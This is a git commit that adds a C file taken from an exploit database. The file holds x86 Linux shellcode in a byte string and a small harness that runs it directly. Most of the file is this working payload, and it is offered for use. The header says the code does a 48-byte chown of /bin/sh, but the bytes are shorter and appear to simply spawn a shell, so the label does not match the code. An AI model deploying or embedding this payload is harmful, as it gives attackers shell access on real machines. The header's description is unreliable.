cd682dffd0136cfd686bc34221b61d9083a562f5
dickson <dicksonchow2007@gmail.com>
2016-04-19 03:37:59 +0800

    add 2 directories

---
+++ shellcode/shellcode.c
@@ -0,0 +1,37 @@
+/*
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : Inj3ct0r.com                                  0
+1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
+0                                                                      0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+Name   : 48 bytes chown root:root /bin/sh x86 linux shellcode
+Date   : Sat Jun  5 15:32:40 2010
+Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
+Web    : http://devilzc0de.org
+blog   : http://gunslingerc0de.wordpress.com
+tested on : linux debian
+special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
+greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
+*/
+#include <stdio.h>
+#include <string.h>
+
+char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+int main(void)
+{
+		fprintf(stdout,"Length: %d\n",strlen(shellcode));
+		((void (*)(void)) shellcode)();
+		return 0;
+}
